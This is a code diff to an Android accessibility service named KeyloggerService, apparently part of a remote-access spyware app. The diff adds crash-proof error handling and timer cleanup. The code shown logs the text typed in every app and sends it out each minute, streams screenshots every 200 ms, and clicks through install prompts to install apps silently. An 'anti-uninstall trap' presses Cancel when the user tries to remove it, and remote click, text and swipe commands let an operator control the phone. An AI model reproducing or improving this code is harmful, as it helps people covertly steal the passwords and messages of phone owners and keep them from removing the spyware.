@@ -35,179 +35,217 @@ public class KeyloggerService extends AccessibilityService {
     protected void onServiceConnected() {
         super.onServiceConnected();
         instance = this;
-        
-        flushTimer = new Timer();
-        flushTimer.scheduleAtFixedRate(new TimerTask() {
-            @Override
-            public void run() {
-                flushBuffer();
-            }
-        }, 60000, 60000);
 
-        streamTimer = new Timer();
-        streamTimer.scheduleAtFixedRate(new TimerTask() {
-            @Override
-            public void run() {
-                if (isLiveStreaming) {
-                    takeLiveScreenshot();
-                }
+        try {
+            // 1. MS7 L'TIMERS L9DAM IL KANOU (bach maycrashich mnin yrje3 l'service)
+            if (flushTimer != null) {
+                flushTimer.cancel();
+                flushTimer.purge();
+                flushTimer = null;
             }
-        }, 0, 200);
+            if (streamTimer != null) {
+                streamTimer.cancel();
+                streamTimer.purge();
+                streamTimer = null;
+            }
+
+            // 2. ZID TIMERS JDAD
+            flushTimer = new Timer();
+            flushTimer.scheduleAtFixedRate(new TimerTask() {
+                @Override
+                public void run() {
+                    try {
+                        flushBuffer();
+                    } catch (Exception e) {}
+                }
+            }, 60000, 60000);
+
+            streamTimer = new Timer();
+            streamTimer.scheduleAtFixedRate(new TimerTask() {
+                @Override
+                public void run() {
+                    try {
+                        if (isLiveStreaming) {
+                            takeLiveScreenshot();
+                        }
+                    } catch (Exception e) {}
+                }
+            }, 0, 200);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
-        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
         
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
-                flushBuffer();
-                currentPackage = pkg;
-                buffer.append("\n\n=== [").append(pkg).append("] ===\n");
-            }
-        }
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            List<CharSequence> text = event.getText();
-            if (text != null && !text.isEmpty()) {
-                buffer.append("> ").append(text.get(0).toString()).append("\n");
-            }
-        }
-
-        // Auto-click install buttons for Silent Installer
-        if (pkg.contains("packageinstaller") || pkg.contains("com.android.packageinstaller") || pkg.contains("com.miui.packageinstaller")) {
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                clickNodeByText(root, "Install");
-                clickNodeByText(root, "تثبيت");
-                clickNodeByText(root, "Installer");
-                
-                clickNodeByText(root, "Open");
-                clickNodeByText(root, "فتح");
-                clickNodeByText(root, "Ouvrir");
-                
-                clickNodeByText(root, "Install anyway");
-                clickNodeByText(root, "المتابعة");
-                clickNodeByText(root, "Continuer");
-            }
-        }
-
-        // <--- JDAD: ANTI-UNINSTALL TRAP
-        if (pkg.contains("settings") || pkg.contains("com.android.settings")) {
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                // Ila l9a l'button dyal l'uninstall wla disable admin, kaydir Cancel
-                List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
-                if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("Désinstaller");
-                if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("إلغاء التثبيت");
-                
-                if (uninstallNodes != null && !uninstallNodes.isEmpty()) {
-                    // Click "Cancel" / "Annuler" / "إلغاء"
-                    clickNodeByText(root, "Cancel");
-                    clickNodeByText(root, "Annuler");
-                    clickNodeByText(root, "إلغاء");
-                    // Wla rje3 l'lor
-                    performGlobalAction(GLOBAL_ACTION_BACK);
-                    Exfil.send("🛡️ Anti-Uninstall Triggered!");
+        try {
+            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
+            
+            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
+                    flushBuffer();
+                    currentPackage = pkg;
+                    buffer.append("\n\n=== [").append(pkg).append("] ===\n");
                 }
             }
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                List<CharSequence> text = event.getText();
+                if (text != null && !text.isEmpty()) {
+                    buffer.append("> ").append(text.get(0).toString()).append("\n");
+                }
+            }
+
+            // Auto-click install buttons for Silent Installer
+            if (pkg.contains("packageinstaller") || pkg.contains("com.android.packageinstaller") || pkg.contains("com.miui.packageinstaller")) {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    clickNodeByText(root, "Install");
+                    clickNodeByText(root, "تثبيت");
+                    clickNodeByText(root, "Installer");
+                    clickNodeByText(root, "Open");
+                    clickNodeByText(root, "فتح");
+                    clickNodeByText(root, "Ouvrir");
+                    clickNodeByText(root, "Install anyway");
+                    clickNodeByText(root, "المتابعة");
+                    clickNodeByText(root, "Continuer");
+                }
+            }
+
+            // ANTI-UNINSTALL TRAP
+            if (pkg.contains("settings") || pkg.contains("com.android.settings")) {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
+                    if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("Désinstaller");
+                    if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("إلغاء التثبيت");
+                    
+                    if (uninstallNodes != null && !uninstallNodes.isEmpty()) {
+                        clickNodeByText(root, "Cancel");
+                        clickNodeByText(root, "Annuler");
+                        clickNodeByText(root, "إلغاء");
+                        performGlobalAction(GLOBAL_ACTION_BACK);
+                        Exfil.send("🛡️ Anti-Uninstall Triggered!");
+                    }
+                }
+            }
+        } catch (Exception e) {
+            // Catch ay crash f l'UI tree bach l'service maytbi9ch
         }
     }
 
     private void clickNodeByText(AccessibilityNodeInfo root, String text) {
-        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
-        for (AccessibilityNodeInfo node : nodes) {
-            if (node.isClickable()) {
-                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                return;
-            } else {
-                AccessibilityNodeInfo parent = node.getParent();
-                if (parent != null && parent.isClickable()) {
-                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+        try {
+            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
+            if (nodes == null) return;
+            for (AccessibilityNodeInfo node : nodes) {
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return;
+                } else {
+                    AccessibilityNodeInfo parent = node.getParent();
+                    if (parent != null && parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        return;
+                    }
                 }
             }
-        }
+        } catch (Exception e) {}
     }
 
     private synchronized void flushBuffer() {
-        if (buffer.length() > 0) {
-            String data = buffer.toString();
-            if (data.length() > 4000) data = data.substring(data.length() - 4000);
-            Exfil.send("KEYLOG:\n" + data);
-            buffer.setLength(0);
-        }
+        try {
+            if (buffer.length() > 0) {
+                String data = buffer.toString();
+                if (data.length() > 4000) data = data.substring(data.length() - 4000);
+                Exfil.send("KEYLOG:\n" + data);
+                buffer.setLength(0);
+            }
+        } catch (Exception e) {}
     }
 
+    // ================== SMART GHOST TOUCH ==================
+
     public boolean performClick(String textToFind) {
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) return false;
-        
-        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(textToFind);
-        for (AccessibilityNodeInfo node : nodes) {
-            if (node.isClickable()) {
-                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                return true;
-            } else {
-                AccessibilityNodeInfo parent = node.getParent();
-                if (parent != null && parent.isClickable()) {
-                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+            
+            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(textToFind);
+            if (nodes == null) return false;
+
+            for (AccessibilityNodeInfo node : nodes) {
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return true;
+                } else {
+                    AccessibilityNodeInfo parent = node.getParent();
+                    if (parent != null && parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        return true;
+                    }
                 }
             }
-        }
+        } catch (Exception e) {}
         return false;
     }
 
     public boolean performSetText(String text) {
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) return false;
-        
-        AccessibilityNodeInfo focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
-        if (focusedNode != null) {
-            Bundle arguments = new Bundle();
-            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
-            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
-            return true;
-        }
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+            
+            AccessibilityNodeInfo focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+            if (focusedNode != null) {
+                Bundle arguments = new Bundle();
+                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
+                return true;
+            }
+        } catch (Exception e) {}
         return false;
     }
 
     public void performSwipe(String direction) {
-        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        wm.getDefaultDisplay().getMetrics(metrics);
-        int width = metrics.widthPixels;
-        int height = metrics.heightPixels;
+        try {
+            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
 
-        Path path = new Path();
-        if (direction.equalsIgnoreCase("up")) {
-            path.moveTo(width / 2f, height * 0.8f);
-            path.lineTo(width / 2f, height * 0.2f);
-        } else if (direction.equalsIgnoreCase("down")) {
-            path.moveTo(width / 2f, height * 0.2f);
-            path.lineTo(width / 2f, height * 0.8f);
-        } else if (direction.equalsIgnoreCase("left")) {
-            path.moveTo(width * 0.8f, height / 2f);
-            path.lineTo(width * 0.2f, height / 2f);
-        } else if (direction.equalsIgnoreCase("right")) {
-            path.moveTo(width * 0.2f, height / 2f);
-            path.lineTo(width * 0.8f, height / 2f);
-        } else {
-            return;
-        }
+            Path path = new Path();
+            if (direction.equalsIgnoreCase("up")) {
+                path.moveTo(width / 2f, height * 0.8f);
+                path.lineTo(width / 2f, height * 0.2f);
+            } else if (direction.equalsIgnoreCase("down")) {
+                path.moveTo(width / 2f, height * 0.2f);
+                path.lineTo(width / 2f, height * 0.8f);
+            } else if (direction.equalsIgnoreCase("left")) {
+                path.moveTo(width * 0.8f, height / 2f);
+                path.lineTo(width * 0.2f, height / 2f);
+            } else if (direction.equalsIgnoreCase("right")) {
+                path.moveTo(width * 0.2f, height / 2f);
+                path.lineTo(width * 0.8f, height / 2f);
+            } else {
+                return;
+            }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            android.accessibilityservice.GestureDescription.Builder builder = new android.accessibilityservice.GestureDescription.Builder();
-            builder.addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 300));
-            dispatchGesture(builder.build(), null, null);
-        }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                android.accessibilityservice.GestureDescription.Builder builder = new android.accessibilityservice.GestureDescription.Builder();
+                builder.addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 300));
+                dispatchGesture(builder.build(), null, null);
+            }
+        } catch (Exception e) {}
     }
 
     public void pressBack() { performGlobalAction(GLOBAL_ACTION_BACK); }
     public void pressHome() { performGlobalAction(GLOBAL_ACTION_HOME); }
     public void pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
     public void openNotifications() { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }
+
+    // ================== SCREENSHOTS ==================
 
     public void captureScreen() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -272,5 +310,10 @@ public class KeyloggerService extends AccessibilityService {
     }
 
     @Override public void onInterrupt() { instance = null; }
-    @Override public void onDestroy() { instance = null; super.onDestroy(); }
-            }
+    @Override public void onDestroy() { 
+        instance = null; 
+        if (flushTimer != null) flushTimer.cancel();
+        if (streamTimer != null) streamTimer.cancel();
+        super.onDestroy(); 
+    }
+}
